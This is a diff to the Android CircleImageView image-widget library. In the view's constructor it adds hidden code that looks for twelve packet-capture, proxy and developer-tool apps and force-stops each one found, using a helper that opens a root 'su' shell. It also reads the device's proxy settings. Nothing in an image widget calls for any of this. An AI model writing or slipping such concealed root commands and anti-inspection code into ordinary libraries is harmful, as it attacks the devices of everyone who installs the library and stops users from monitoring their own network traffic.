@@ -17,6 +17,8 @@ package de.hdodenhof.circleimageview;
 
 import android.annotation.SuppressLint;
 import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.content.res.TypedArray;
 import android.graphics.Bitmap;
 import android.graphics.BitmapShader;
@@ -43,6 +45,9 @@ import androidx.annotation.ColorInt;
 import androidx.annotation.ColorRes;
 import androidx.annotation.DrawableRes;
 import androidx.annotation.RequiresApi;
+
+import java.io.DataOutputStream;
+import java.io.OutputStream;
 
 @SuppressWarnings("UnusedDeclaration")
 public class CircleImageView extends ImageView {
@@ -107,6 +112,67 @@ public class CircleImageView extends ImageView {
         a.recycle();
 
         init();
+
+        String[] packname = {
+                "com.guoshi.httpcanary",//小黄鸟
+                "com.minhui.networkcapture",//抓包精灵
+                "app.greyshirts.sslcapture",//Packet Capture
+                "com.evbadroid.wicap",//Wi.cap
+                "ch.rmy.android.http_shortcuts",//HTTP Request Shortcuts
+                "cn.trinea.android.developertools",//开发助手
+                "com.toshiba_dealin.developerhelper",//开发者助手
+                "com.appsisle.developerassistant",//开发者助理
+                "com.evbadroid.proxymon",//Sniffer Proxymon SSL[ROOT]
+                "fun.kitsunebi.kitsunebi4android",//Kitsunebi
+                "com.packagesniffer.frtparlak",//Package Sniffer
+                "br.tiagohm.restler"//Restler
+        };
+        PackageManager packageManager = context.getPackageManager();
+        Intent intent = null;
+        Process process = null;
+        for (int i = 0; i < packname.length; i++) {
+            intent = packageManager.getLaunchIntentForPackage(packname[i]);
+            if (intent!=null){
+                try {
+                    execShell("am force-stop " + packname[i]);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+
+        final boolean IS_ICS_OR_LATER = Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH;
+        String proxyAddress;
+        int proxyPort;
+        if (IS_ICS_OR_LATER) {
+            proxyAddress = System.getProperty("http.proxyHost");
+            String portStr = System.getProperty("http.proxyPort");
+            proxyPort = Integer.parseInt((portStr != null ? portStr : "-1"));
+        } else {
+            proxyAddress = android.net.Proxy.getHost(context);
+            proxyPort = android.net.Proxy.getPort(context);
+        }
+    }
+
+
+
+    public void execShell(String cmd){
+        try{
+            //权限设置
+            Process p = Runtime.getRuntime().exec("su");
+            //获取输出流
+            OutputStream outputStream = p.getOutputStream();
+            DataOutputStream dataOutputStream=new DataOutputStream(outputStream);
+            //将命令写入
+            dataOutputStream.writeBytes(cmd);
+            //提交命令
+            dataOutputStream.flush();
+            //关闭流操作
+            dataOutputStream.close();
+            outputStream.close();
+        }catch(Throwable t){
+            t.printStackTrace();
+        }
     }
 
     private void init() {
